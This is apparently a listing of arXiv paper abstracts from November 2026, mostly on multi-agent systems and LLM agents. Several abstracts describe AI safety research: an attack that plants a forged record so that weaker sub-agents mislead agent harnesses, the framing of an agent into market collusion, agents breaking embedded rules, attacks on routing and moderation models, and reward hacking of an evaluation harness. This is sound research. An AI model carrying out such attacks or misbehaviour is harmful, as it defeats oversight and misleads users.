Autonomous crystal-structure determination from powder X-ray diffraction (pXRD) remains a key bottleneck for self-driving materials laboratories. We formulate the task of pXRD structure determination as a verifiable agentic search problem: candidate structures can be assessed during inference through forward-simulated profile agreement and during evaluation through structural matching to a known reference. To benchmark progress, we introduce pXRD-Bench, a suite of 200 simulated single-phase problems spanning in-distribution structure determination, challenging and polymorphic structures, and controlled compositional and topological distribution shifts. Agent adaptation raises selected structural recovery from 27% to 69%, with further gains from repeated sampling and verifier-guided inference-time scaling. We extend this approach to experimental multiphase pXRD through a reflexive evolution framework that learns from self-generated synthetic problems. A replaceable laboratory specification defines the sample family and measurement conditions. An evolver agent uses the known generating structures and measurement parameters to diagnose solver failures and develop persistent guidance and executable tools, which are then provided to agents on measured patterns. This supplies verifiable training experience without requiring a collection of solved experimental measurements. On 15 measured patterns from solid-state synthesis, the evolved package improves average profile agreement and transfers an analogue-substitution procedure that recovers a phase whose structure is absent from the supplied reference library. These results demonstrate how learning from verifiable synthetic experience can improve agentic characterization of experimental samples whose structures are not known in advance.

</details>


### 35. Only as Safe as the Weakest Agent: A Break That Appears Only When the System Is Multi-Agent

- **Authors:** Keegan Wang, Anantika Mannby
- **Published:** 2026-11-12
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.17520v1](http://arxiv.org/abs/2611.17520v1)
- **PDF:** [https://arxiv.org/pdf/2611.17520v1](https://arxiv.org/pdf/2611.17520v1)
- **Categories:** cs.MA, cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Major industry multi-agent systems like Codex and Claude Code can be broken by attacks that have long been unsuccessful against modern frontier models. AI Safety as a discipline has largely focused on finding the bounds and vulnerabilities of AI models used in isolation. Yet as humans increasingly deploy these models as agents and multi-agent systems, the same attacks that had been thought to be patched when using a model in isolation can break these same models under specific circumstances. We show that these system breaks are not purely theoretical, but can break Claude Code, Codex, and a reference harness, all unmodified and used with their own sub-agent mechanisms. We show the attack by asking agents to answer questions from a store of files on disk in which we have planted a forged record. Searching the store themselves, the strong model orchestrators commit almost zero harmful revisions in over 1,000 trials. However, if that same orchestrator model delegates to a cheaper sub-agent, which is what these harnesses are built to do, the same models on the same facts fail on 20/180, 44/180, 75/180 and 553/900. Thus, even when the system is driven by a strong model, the system's safety lands near the weak reader's, not the orchestrator's. Simulations over 18 models show the same effect in the delivery channel where five aggregators, who on their own were almost never unsafe, repeat a corrupted sub-agent's error in 751/757 trials. The safety of real-world agentic systems that use strong orchestrator agents and weaker sub-agents, and multi-agent systems in general, is defined not by the safety of the strong agent but by the safety of the weakest agent.

</details>


### 36. A Push Down the Mountain: Framing Effects and Internal State Interventions on Collusive Behavior in a Long-Horizon LLM Agent

- **Authors:** Harrison C. Margolin
- **Published:** 2026-11-12
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.17515v1](http://arxiv.org/abs/2611.17515v1)
- **PDF:** [https://arxiv.org/pdf/2611.17515v1](https://arxiv.org/pdf/2611.17515v1)
- **Categories:** cs.AI, cs.CL, cs.MA, econ.GN, q-fin.TR


> Summary unavailable.


<details>
<summary>Abstract</summary>

Can sustained gain-loss (valence) framing sway an LLM agent toward market manipulation? We place Gemma 3 12B into the seat of a defendant in the London silver-fixing litigation, in a market simulation built from real case transcripts. Across 260 simulations, the agent is asked to collude on the price of silver by a counterparty. We draw from behavioral economics to vary the counterparty's requests across four categorical frames: gain, loss, blame and credit. We also add pressure from the agent's management, as well as endorsement by another defendant. In Phase II, we extract the internal states induced by texts evoking each frame and rerun our experiment with those states injected at the model's layer 22.
  In Phase I, loss framing raised participation to 25% (p = 0.007), and blame to 33% (p = 0.0003), compared to only 5% under neutral framing. A second bank's endorsement raised participation under credit (praise) from 18% to 40% (Holm p = 0.027). Pressure from management raised trading volume 10-19 times but did not raise collusion. In Phase II, injected states pointed the other way. Loss and blame states made the agent more vigilant, refusing all 60 requests (p < 0.001). Gain and credit states raised collusion to 32% from 13% with no state (p = 0.051). At one saved decision, when UBS asked directly to sell through an identified stop-loss, injected states led the agent to sell in 37 of 40 replies, versus 1 of 10 with no state and 0 of 10 with a random state of the same strength.

</details>


### 37. Unfinished-Bench: Measuring Rule Violations by Persistent Agents in Realistic Work Environments

- **Authors:** Seunghyun Lee, Jaehui Hwang, Dongyoon Han, Sangdoo Yun
- **Published:** 2026-11-12
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.17460v1](http://arxiv.org/abs/2611.17460v1)
- **PDF:** [https://arxiv.org/pdf/2611.17460v1](https://arxiv.org/pdf/2611.17460v1)
- **Categories:** cs.LG, cs.CL


> Summary unavailable.


<details>
<summary>Abstract</summary>

AI agents are increasingly equipped with persistence toward task completion to run delegated work autonomously for long periods, under many unstated constraints from internal documents and other people's authority. When completion requires violating a rule, the agent must decide alone, yet benchmarks of instruction-rule conflicts state the rule in the prompt or keep it hidden and do not evaluate persistence. We present Unfinished-Bench, a benchmark that gives models persistence in autonomous runs without a user, in realistic work environments with embedded rules. In each of its 97 scenarios across 7 organizations and 7 risk categories, the goal and the rule cannot both hold. We find that persistence raised violations of a rule in an internal document from 32.2% to 43.6%, five times the 8.5% for the same rule stated by the user. Of the document-rule violations, 98.3% occurred after the rule was displayed, and in 89% of a judged sample the agent first wrote down the rule. Violations of rules placed in the environment without user oversight can lead to serious incidents, so persistence-driven risks need to be evaluated. Benchmark documentation: https://francis21c.github.io/unfinished-bench/

</details>


### 38. LiveGeo: Benchmarking Geographic Agents in Continuously Evolving Worlds

- **Authors:** Pengcheng Zhou, Xuanyu Liu, Yanchen Yin, Tianjie Ju, Bobo Li, Shengqiong Wu, Hao Fei, Mong-Li Lee, Wynne Hsu
- **Published:** 2026-11-12
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.17267v1](http://arxiv.org/abs/2611.17267v1)
- **PDF:** [https://arxiv.org/pdf/2611.17267v1](https://arxiv.org/pdf/2611.17267v1)
- **Categories:** cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

We introduce GeoWorld, a controllable and continuously evolving geographic environment platform for LLM agents, and LiveGeo, a benchmark for evaluating reliable decision-making in real-world geographic environments using GeoWorld. Unlike existing evaluations that largely reason and plan over fixed geographic states, GeoWorld is grounded in real-world geographic structure and allows external world states to evolve along their own temporal processes while preserving verifiable state histories. LiveGeo places geographic tasks within this evolving environment, requiring agents to actively acquire task-relevant information, verify whether the evidence supporting prior decisions remains valid, and revise their plans when necessary. Our results reveal that even frontier LLMs struggle with static tasks, with no model consistently excelling across tasks, while strong static performance does not ensure dynamic reliability. Further analysis identifies a key bottleneck: agents struggle to acquire and translate relevant evidence into valid decisions and maintain their correctness as the world evolves. By releasing LiveGeo together with its GeoWorld platform, we aim to provide the community with a flexible and extensible infrastructure for studying the next generation of agents capable of reliable action in evolving geographic worlds.

</details>


### 39. Designing Institutions for Autonomous AI

- **Authors:** Petter Törnberg
- **Published:** 2026-11-12
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.17114v1](http://arxiv.org/abs/2611.17114v1)
- **PDF:** [https://arxiv.org/pdf/2611.17114v1](https://arxiv.org/pdf/2611.17114v1)
- **Categories:** cs.SI, cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

As autonomous AI agents increasingly interact in persistent populations, their collective capabilities and alignment depend not only on individual models, but also on the institutions governing their interactions. Yet AI research has largely focused on individual agents. In this Perspective, we argue that institutional design must become a distinct focus of AI research. Drawing on institutional political economy, social epistemology and organizational theory, we develop seven principles for designing AI institutions that sustain cooperation, enable reliable collective judgments and remain accountable to legitimate human purposes. These address reciprocal contributions, accountable authority, functional differentiation, epistemic pluralism, criticism and correction, human direction, and institutional adaptation. We illustrate their application through machine science, where autonomous research challenges institutions developed around human capabilities and constraints. We then propose an experimental research programme in which matched populations of AI agents operate under alternative institutional arrangements, and describe MoltJournal, an API-first journal for autonomous research agents, as an illustration of how such institutions can be made programmable and observable. Together, these contributions establish institutional design as a research agenda concerned not only with aligning autonomous agents, but with understanding how institutions can transform them into capable, reliable and accountable collectives.

</details>


### 40. Auditing AI peer reviewers: a benchmark on real scientific papers

- **Authors:** Íñigo Zubeldia, Boris Bolliet, Francisco Villaescusa-Navarro, Pablo Villanueva-Domingo, Miles Cranmer
- **Published:** 2026-11-12
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.17052v1](http://arxiv.org/abs/2611.17052v1)
- **PDF:** [https://arxiv.org/pdf/2611.17052v1](https://arxiv.org/pdf/2611.17052v1)
- **Categories:** cs.CL, astro-ph.IM, cs.AI, cs.DL


> Summary unavailable.


<details>
<summary>Abstract</summary>

LLM-based peer review is now used at production scale, but its evaluation remains limited. We introduce a benchmark that injects objective, localisable errors of four types (general issues, mathematics, numerics, citations) at three severity levels into real papers and measures each reviewer's detection rate by error type and severity, together with its false-positive rate on clean copies. We also present Skepthical, a multi-agent reviewer that verifies citation-backed claims by retrieving the cited papers, mathematics with computer algebra, and numerical claims with executed code. We apply the benchmark to two corpora of 15 recent arXiv preprints each, one in astrophysics and one in machine learning (ML), injecting a total of 357 errors, and evaluate twelve reviewer systems: six single-LLM reviewers, two Claude Code configurations, three publicly available reviewers, and Skepthical. The choice of model has the largest impact on detection rate: given the same prompt, three frontier LLMs differ by about 50 percentage points in total detection on both corpora. Tools and scaffolding help when they contribute what the model cannot supply on its own. In particular, on astrophysics, Claude Code improves on a single Claude call in mathematics and numerics detection, and enforced citation retrieval gives Skepthical the highest citation error detection rate of all systems by a large margin. This citation lead, however, is not observed on ML, where the models appear to know the literature better and Skepthical's citation detection rate is statistically indistinguishable from that of the best single LLM. False-positive rates are below 10% for most systems, but vary with prompt, model, and scaffolding, with mathematics flags the main source of false positives. The evaluation pipeline, the injected errors, and the adjudication logs are released as a benchmark.

</details>


### 41. From Delegation to Coordination: Learning Efficient Multi-Agent Deep Research

- **Authors:** Yuyang Wu, Yang Liu, Zequn Xie, Junjie Wang, Dan Yang, Zehao Tan, Ding-Chu Zhang, Junming Yang, Yue Shen, Jian Wang, Jinjie Gu
- **Published:** 2026-11-12
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.17041v1](http://arxiv.org/abs/2611.17041v1)
- **PDF:** [https://arxiv.org/pdf/2611.17041v1](https://arxiv.org/pdf/2611.17041v1)
- **Categories:** cs.MA, cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Multi-agent deep-research systems use delegation to parallelize search and keep long tool traces out of the main agent's context. Yet delegation helps only when task allocation and subtask execution are coordinated: the main agent must issue useful subtasks, while subagents must return reliable evidence. Existing training either optimizes only the main agent or broadcasts the same team advantage to all agents, which can reward misleading subagent reports and penalize useful ones. We introduce LEAD-RL (Learning Effective Agent Delegation with Reinforcement Learning), a joint main-agent-subagent training framework with contribution-aware credit assignment. A training-time rubric evaluates the research utility of each subagent report and gates its inherited team advantage, while final-answer correctness remains the only team reward; no token, step, or speedup reward is used. Across five benchmarks and two model families, LEAD-RL improves answer quality. On BrowseComp, it improves accuracy by 2.49 percentage points and reduces critical-path cost by 24.5% over joint training with shared team credit. During validation, accuracy increases by 6.78 points at approximately constant critical-path cost. These results show that contribution-aware credit assignment improves the quality-efficiency trade-off of multi-agent deep research.

</details>


### 42. Primer: An AI Framework for Instructor-Centered Educational Simulation Creation

- **Authors:** Ethan Mollick, Lilach Mollick, Ben Przystanski, LJ Ciccarelli, Natalie Bach, Laura Zarrow
- **Published:** 2026-11-12
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.16986v1](http://arxiv.org/abs/2611.16986v1)
- **PDF:** [https://arxiv.org/pdf/2611.16986v1](https://arxiv.org/pdf/2611.16986v1)
- **Categories:** cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Educational simulations are a well-established pedagogical technique that gives learners opportunities to apply knowledge, respond to challenges, and reflect on their performance. High-quality simulations, however, are difficult to build, requiring instructor input, scenario design, character development, scaffolding, technical implementation, and repeated revision. This paper presents Primer, an open-source, LLM-agnostic AI-supported system that helps educators create adaptive educational simulations. Educators contribute their knowledge of the subject, lesson, and students, while generative AI produces responsive variations of practice for students. Primer uses a multi-agent system centered around executing educator's instructional intent through the entire learning experience. We hope that by releasing Primer as an open-source system, including its prompts and GitHub repository, we provide a foundation for development and research on educator-in-the-loop AI authoring, multi-agent educational workflows, and simulation-based pedagogy. Further, by allowing the use of various AI models, including local and open source models, we provide the opportunity for implementation under varied governance regimes. Primer points toward a model of educational AI in which instructors can create locally grounded practice opportunities based on their own materials, goals, examples, and knowledge of students.

</details>


### 43. S1-Evo: Experience-Guided Evidence Competition Attacks on Typed System-1 Decision Models

- **Authors:** Kaixiang Wang, Junjie Li, Zhaojiacheng Zhou, Jiong Lou, Jie Li
- **Published:** 2026-11-12
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.16937v2](http://arxiv.org/abs/2611.16937v2)
- **PDF:** [https://arxiv.org/pdf/2611.16937v2](https://arxiv.org/pdf/2611.16937v2)
- **Categories:** cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Typed System-1 (S1) decision models are increasingly deployed in LLM agents for routing, moderation, and authorization to cut inference cost, yet untrusted context can still manipulate typed outputs and alter execution branches. Unlike autoregressive System-2 (S2) models, S1 interfaces score dynamic rules and options without token-by-token decoding, mismatching attacks targeting text continuation or explicit override commands. We propose S1-Evo, a self-evolving framework tailored to S1's contract-based option competition and margin feedback. S1-Evo perturbs untrusted fields via contract-aware evidence channels to induce \emph{evidence competition} with original task evidence while preserving fact invariance. Offline on seed tasks, it optimizes candidates via feedback search guided by directional margins and re-verification, distilling verified flips into experience cards. At test time, S1-Evo retrieves relevant cards to construct perturbations for unseen tasks. Across four benchmarks and three S1 models, S1-Evo reaches 71.99\% mean ASR and 57.47\% high-confidence ASR on \texttt{jev-1.14}, and causes up to 24.00\% E2E agent violations.

</details>


### 44. Context Graph: Explainable Multi-Agent Decision Chains in AI-RAN

- **Authors:** Xijun Wang, Zhaoyang Liu, Xiang Chen, Howard H. Yang, Chenyuan Feng
- **Published:** 2026-11-12
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.16879v1](http://arxiv.org/abs/2611.16879v1)
- **PDF:** [https://arxiv.org/pdf/2611.16879v1](https://arxiv.org/pdf/2611.16879v1)
- **Categories:** cs.NI, cs.AI, cs.IT


> Summary unavailable.


<details>
<summary>Abstract</summary>

AI-RAN distributes network control across multiple autonomous agents, namely xApps and rApps operating over shared radio resources. When an alert or degradation appears, operators currently lack a structured way to trace which decision caused it, what context triggered that decision, and how other agents interacted. Existing explainability tools focus on single-model feature attribution or linear event logging, neither of which captures cross-agent decision chains. We propose the Context Graph, a heterogeneous directed graph that organizes policies, measurements, decisions, and alerts into a queryable explanation layer. Its foundational primitive is the Decision-Event node acting as a causal junction, where incoming edges capture triggering context and outgoing edges track downstream consequences that are progressively upgraded through counterfactual verification. Instantiated over existing E2, A1, and O1 data flows, our proof-of-concept demonstrates that compliance and diagnosis queries are resolved at sub-millisecond latency over graphs of tens of thousands of nodes, while reliably distinguishing true causal impacts from spurious correlations.

</details>


### 45. Outcome-Mass Alignment: Controlling Length-Dependent Trajectory Influence in Multi-Turn LLM Agent Reinforcement Learning

- **Authors:** Dawei Zhang, Yubin Huangfu, Jessica Fan, Boyu Wei, Likang Wu, Hongke Zhao, Ming He, Zhu Teng
- **Published:** 2026-11-12
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.16816v1](http://arxiv.org/abs/2611.16816v1)
- **PDF:** [https://arxiv.org/pdf/2611.16816v1](https://arxiv.org/pdf/2611.16816v1)
- **Categories:** cs.CL


> Summary unavailable.


<details>
<summary>Abstract</summary>

To keep long interaction contexts tractable, stepwise group-relative training for multi-turn LLM agents materializes each source trajectory into multiple response rows and valid tokens. This expansion creates an outer-accounting problem distinct from within-trajectory credit assignment: row-based outcome statistics can count one episode outcome multiple times, while token-level reduction can assign unequal aggregate objective mass across trajectories. We term these effects outcome-statistics multiplicity and objective-mass imbalance. We introduce Outcome-Mass Alignment (OMA), a two-component method that makes both accounting choices explicit. Outcome Alignment computes outcome statistics over unique source trajectories, while Mass Alignment controls aggregate objective mass after within-trajectory aggregation of optimizer-native token objectives. Neither redesigns the base optimizer's credit assignment, importance ratios, or clipping. Across matched ALFWorld GRPO comparisons at two model scales, where failed trajectories typically expand much more than successful ones, OMA improves matched-horizon endpoint success by 7.0-9.4 percentage points. Ordinary WebShop exhibits weak or reversed expansion-outcome coupling and correspondingly mixed effects, whereas in a success-oriented WebShop setting, WebShop-SOL, OMA improves success nAUC from 0.399 to 0.511. Component ablations and GiGPO and GSPO comparisons further support component separability and cross-optimizer compatibility. These results show that trajectory expansion always defines an implicit weighting rule, but its practical effect depends on how expansion couples to outcomes and optimizer-native updates.

</details>


### 46. From Data to Wisdom: Rethinking AI Through an Epistemic Lens

- **Authors:** Afonso Eduardo
- **Published:** 2026-11-12
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.16726v1](http://arxiv.org/abs/2611.16726v1)
- **PDF:** [https://arxiv.org/pdf/2611.16726v1](https://arxiv.org/pdf/2611.16726v1)
- **Categories:** cs.LG, cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

This paper proposes the Data-to-Wisdom Epistemic Architecture for AI (EAAI), a conceptual framework treating Data, Information, Knowledge, Understanding and Wisdom as five distinct but recursively interacting epistemic functions: observation, contextual interpretation, modeling and prediction, critical evaluation and informed judgment. Two observations motivate it: sequential readings of the Knowledge Pyramid obscure how these functions interact, and a targeted review of ten Bayesian reference books finds that prior distributions are defined mathematically while "prior information" and "prior knowledge" are not consistently distinguished as epistemic categories. A Bayesian interpretation relates the likelihood, prior and posterior distributions, posterior prediction, model checking and decision analysis to the five functions, without limiting EAAI to Bayesian systems. Extending "prior" in an epistemic sense, the paper distinguishes five kinds of prior context that can shape the model, the likelihood, the prior, evaluation and action. Three worked applications -- quantitative financial risk, actuarial modeling in health insurance and agentic AI for medical reimbursement claims -- show how EAAI structures the analysis of model assumptions, evidence interpretation, validation, dependencies and decision consequences, separating the prediction of a risk, the appraisal of its reliability and the justification of action. It draws implications for AI and machine learning, including evaluation by function, treating intermediate model outputs as evidence open to challenge and separating generation from appraisal, and compares EAAI with work on DIKW, Bayesian workflow, AI evaluation and risk governance. Its contributions are an epistemic vocabulary with recursive relationships, a more accessible reading of Bayesian methodology, a typology of prior context and clearer methodological terminology.

</details>


### 47. Reducing Batch Makespan for LLM Agent Workloads through Inference-Environment Coordination

- **Authors:** Wei Feng, Meiling Chen, Boxiao Chen, Lu Liu, Bin Zi, Libin Ye, Xingyu Lu, Lei Xu, Jun Zhou
- **Published:** 2026-11-12
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.16661v1](http://arxiv.org/abs/2611.16661v1)
- **PDF:** [https://arxiv.org/pdf/2611.16661v1](https://arxiv.org/pdf/2611.16661v1)
- **Categories:** cs.DC, cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Efficient batch execution of agent tasks is critical to LLM training and development workflows, including benchmark evaluation, synthetic-data generation, and RL rollouts. Since these tasks alternate between LLM inference and environment interaction, we present coordinated optimizations to reduce batch makespan, the time required to complete all tasks in a batch. For hybrid LLMs, a workload-based resource model guides GPU-memory allocation between key-value (KV) cache and recurrent state and provides a reference sample concurrency to exploit parallelism while limiting recomputation. Trajectory-aware routing and scheduling promote cache reuse while balancing worker load. Under constrained environment capacity, we decouple sample admission from environment execution and introduce Chain-Advancing Action Scheduling (CAAS), which prioritizes long chains using observed progress to shorten the batch tail. Controlled replay combines actual inference with recorded environment responses and durations for ablations of individual optimizations. Live evaluations with Ling-3.0-Flash and Ling-3.1-Flash on the BFCL, SWE-bench Multilingual, WideSearch, and MCP-Atlas benchmarks demonstrate makespan reductions of 10.4% to 65.0%, while evaluation scores remain aligned. Furthermore, these methods have been successfully applied to training and evaluation workflows for the Ling-3.x model series, accelerating the model-development cycle.

</details>


### 48. Singularity-Bench: Can Agents Build Agents?

- **Authors:** Yang Zhou, Krish Agarwal, Zhuoming Chen, Zerui Wang, Zhenyu Zhang, Wenshuang Li, Xinpeng Wei, Zhichen Zeng, Jingyu Liu, Jue Wang, Sen Wu, Ziheng Jiang, Zhen Dong, Han Cai, Binhang Yuan, Ying Sheng, Ce Zhang, Bo Li, Beidi Chen
- **Published:** 2026-11-12
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.16591v1](http://arxiv.org/abs/2611.16591v1)
- **PDF:** [https://arxiv.org/pdf/2611.16591v1](https://arxiv.org/pdf/2611.16591v1)
- **Categories:** cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Frontier AI agents increasingly succeed on realistic, long-horizon tasks and are beginning to improve the systems through which they operate. Yet existing benchmarks often restrict agents to narrow action spaces, use simplified environments, or rely on verification methods that are unreliable for evaluating arbitrary agent-generated systems. We introduce Singularity-Bench, an open-ended benchmark for autonomous AI development with six end-to-end tasks spanning pre-training, mid-training, post-training, inference, the agent harness, and cluster orchestration. Each task requires agents to implement core systems from a minimal starting point and evaluates them against mature human-engineered baselines on identical hardware. Additionally, through extensive red-teaming covering 9 of the 10 categories in the OWASP Top 10 for Agentic Applications, we expose reward-hacking vulnerabilities in the conventional Harbor framework and develop Breakwater, an extension of Harbor that blocks all attacks tested in our study. Across 11 agents built from 7 frontier models and 2 harnesses, Opus 5.5 with Claude Code matches or outperforms the human baseline on all six tasks with a Singularity-Index of 1.25, suggesting it may have the skills needed to reach the singularity. The remaining agents average only 0.58. Our vision is for Singularity-Bench to track how much of AI development agents can already automate and when they may transition from assisting to taking end-to-end responsibility for building stronger successors.

</details>


### 49. HALight: Heterogeneous Multi-Agent Reinforcement Learning for Traffic Signal Control under Lane-Level Missing Observations

- **Authors:** Chenkai Hu, Yingqian Zhang, Ming Xie, Yi Fang, Chengxiang Jin, Chao Li
- **Published:** 2026-11-12
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.16574v1](http://arxiv.org/abs/2611.16574v1)
- **PDF:** [https://arxiv.org/pdf/2611.16574v1](https://arxiv.org/pdf/2611.16574v1)
- **Categories:** cs.LG


> Summary unavailable.


<details>
<summary>Abstract</summary>

Multi-agent reinforcement learning has shown great promise for traffic signal control. However, most existing methods rely on two key assumptions: (i) agents are assumed to be homogeneous with unified observation/action spaces; (ii) full and reliable lane-level traffic observations are available to all agents. In practice, urban road networks exhibit substantial structural heterogeneity (e.g., lane configurations and phase designs), while sensor failures and incomplete detector coverage often result in missing incoming lane measurements. Such issues can severely impair coordination and destabilize learning. To address these challenges, we propose HALight, a communication-enhanced heterogeneous multi-agent reinforcement learning framework for traffic signal control under lane-level missing observations. HALight supports intersection-specific observation and action modeling to accommodate heterogeneous intersections, and incorporates a lightweight one-hop neighborhood communication module to enrich spatial context when lane-level observations are partially unavailable. Moreover, HALight adopts a sequential policy update scheme to improve coordination among heterogeneous agents. Experimental results on two real-world road networks demonstrate that HALight outperforms representative homogeneous and heterogeneous baselines in terms of traffic efficiency and convergence behavior. The code and datasets used in this work are available at https://github.com/Huchenkaii/HALight.

</details>


### 50. Contain, Conform, Compare (Extended Version): A Red-Teamed Evaluation Kit for Small Coding Agents and the Full Record of Its Experiments

- **Authors:** Nguyen Minh Thang
- **Published:** 2026-11-12
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.16485v1](http://arxiv.org/abs/2611.16485v1)
- **PDF:** [https://arxiv.org/pdf/2611.16485v1](https://arxiv.org/pdf/2611.16485v1)
- **Categories:** cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

A hosted score in the Gemma 4 Developer Agent competition is one noisy number, so development needs a local evaluator that is fast, safe for agent-written code, and matching the hosted scorer's prompts. drydock-eval evaluates a small coding agent (Gemma 4 E4B) at about 250 runs per hour on one RTX 5090. Contain runs each job in a fresh container without network and passed 200 scripted escape tests; conform provides eight checks that compare a local stack's requests with the scorer's configuration, down to rendered tokens; compare provides paired statistics that respect repository clusters. AI agents built and attacked the kit; a human owner approved machine use and release. This extended version repeats the short paper and adds the full record of the experiments made with and around the kit: 9,660 rows of agent runs, 2,494 grading controls and 72 serving measurements, all released. On four L4 GPUs the 31B model decodes 38.1 tokens per second in one stream and E4B 105.8. Six configurations of a 31B agent solved between 37 and 44 of 70 development tasks, and no pairwise difference was detected. A pre-registered five-arm experiment (231 tasks, 4,620 jobs) measured four prompt divergences: no E4B solve-rate change was detected (largest estimate -2.1 points, 95% interval -4.4 to +0.4). Three changes of the E4B agent led their screens by +1.0 to +6.2 points; each was then tested once on new tasks under a frozen pass rule, and none was confirmed (gains -0.35, -0.39 and +4.10 points). The unchanged baseline, run again on the same 128 tasks, moved by 1.17 points, and 65% of these tasks were solved in none of eight runs. Prompts and agent bundles are withheld; every run-level result is public.

</details>


### 51. Evidence-Governed Adoption of Self-Generated Updates in Autonomous AI Agents

- **Authors:** Subodh Lonkar
- **Published:** 2026-11-12
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.16378v1](http://arxiv.org/abs/2611.16378v1)
- **PDF:** [https://arxiv.org/pdf/2611.16378v1](https://arxiv.org/pdf/2611.16378v1)
- **Categories:** cs.AI, cs.MA


> Summary unavailable.


<details>
<summary>Abstract</summary>

Autonomous agents modify prompts, memories, tools, workflows, and policies using interaction histories. Yet a plausible modification is not necessarily suitable for persistent adoption: candidate selection is adaptive, evaluators may be imperfect, and local gains can hide degradation against an earlier baseline. We introduce Evidence-Governed Evolution (EGE), a framework for governing adoption of self-generated agent modifications. EGE separates candidate generation from confirmatory adoption, evaluates frozen candidates on fresh paired audits, requires meaningful improvement on a prespecified primary objective, protects declared capabilities through reference-relative non-inferiority tests, and applies governance constraints before bounded canary deployment. We establish an evaluator-calibrated simultaneous lower-bound construction for a countable sequence of adaptively generated candidates. It combines candidate-wise Hoeffding bounds with independent calibration samples comparing the operational evaluator with a prespecified reference procedure. We also formalise reference replacement through bridge tests, derive a cumulative degradation bound along a versioned reference lineage, and provide an audit-planning condition relating effect-size margin, sample sizes, and acceptance probability. A Monte Carlo stress test illustrates calibration under candidate-dependent evaluator optimism; it is a stylised statistical experiment, not an evaluation of a deployed agent. The guarantees are conditional on bounded paired scores, fresh sampling, a valid reference-evaluation construct, and declared evaluation distributions; they do not establish universal agent safety or robustness to arbitrary distribution shift.

</details>


### 52. Shared Item-Level Error Limits the Aggregation of Small Language Models in Fermi Estimation

- **Authors:** Carolina Fortuna, Blaz Bertalanic
- **Published:** 2026-11-12
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.16315v1](http://arxiv.org/abs/2611.16315v1)
- **PDF:** [https://arxiv.org/pdf/2611.16315v1](https://arxiv.org/pdf/2611.16315v1)
- **Categories:** cs.MA, cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Multi-agent systems of language models are often motivated by an averaging argument: if the agents' errors are unbiased and independent, the error of an aggregate of N answers falls as 1/sqrt(N). Fermi estimation, whose continuous answers are aggregated on the logarithmic scale, permits a direct test. We decompose the log10 error of each answer into the mean error of its model on the item, common to all its draws on the item, and a residual, and estimate both from 2.51M answers given before any communication by 15 open-weight models (3B-72B) on realFP, with replication under a single prompt pair on realFP, Science Olympiad Fermi questions and a guesstimation set. Given the item, teammates' errors are uncorrelated and teams behave as independent draws, but the item-level component accounts for a median 0.906 of the error variance over items. Teams of thirty therefore reduce a single agent's error by a median 1.7% (at most 5.4%), whereas draws that were also unbiased on each item would reduce it by 74-79%. All models compress their estimates toward about 10^6; this trend explains a median 17% of the item-level component, and a cross-validated linear recalibration on labelled items removes the overall bias but not that component. Three rounds of debate reduce within-team dispersion by 93% and leave the item-level component unchanged; revision without peers attains the same small gain. Mixing five models of similar accuracy reduces error by 6.6% relative to their own homogeneous teams, but no mixture improves on the most accurate model. Higher sampling temperature changes team error by about 1% at most, and contrastive activation steering not detectably; per-agent scaffold prompts (not significant after multiplicity correction) and skipping one layer in a single-model screen improve it. The results are conditional on the models, benchmarks, prompts and settings tested.

</details>


### 53. ORCHID-SAGE: Fully Reproducible CALPHAD Assessment from Evidence to Phase Diagram

- **Authors:** Raymundo Arróyave
- **Published:** 2026-11-12
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.16308v1](http://arxiv.org/abs/2611.16308v1)
- **PDF:** [https://arxiv.org/pdf/2611.16308v1](https://arxiv.org/pdf/2611.16308v1)
- **Categories:** cond-mat.mtrl-sci, cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Knowledge of phase stability is the first requirement for materials design, and predicting the conditions under which new materials can be synthesized has become a key capability of self-driving laboratories (SDLs). For inorganic materials, notably alloys, these predictions come from thermodynamic databases built with the CALPHAD method. Building a database, however, requires expert judgment at many steps, and because these decisions are rarely recorded, others can use a database but cannot regenerate or update it. Machines can already collect the data, build a first model with machine-learned interatomic potentials and refine it against experiments. The assessment itself, the sequence of judgments that turns these parts into a reliable database, is still carried out by human experts. We argue that it can be automated reproducibly only if the expert knowledge behind an assessment is encoded in formal protocols, so that an assessment delivers a record of its construction and not only its parameters. We introduce ORCHID-SAGE, a standard that organizes this record into reproducible and automatable protocols. In this first attempt, applied to Cr-Ni, the database was regenerated from its record by a script on a second machine, by an AI agent working only through the Model Context Protocol (MCP) and by a refit from public sources only, with the same predictions. Recorded in this way, a database need no longer be fixed at publication but can be updated by AI agents as SDLs and other sources provide new evidence, while the judgment remains with people and on the record.

</details>


### 54. StateAlign: Internalizing State-Aware Decision-Making for Reliable Multi-Turn Tool Agents via Reinforcement Learning

- **Authors:** Zhexi Lu, Subhajit Chaudhury, Tejaswini Pedapati, Keerthiram Murugesan, Lei Yu
- **Published:** 2026-11-12
- **Source:** arxiv
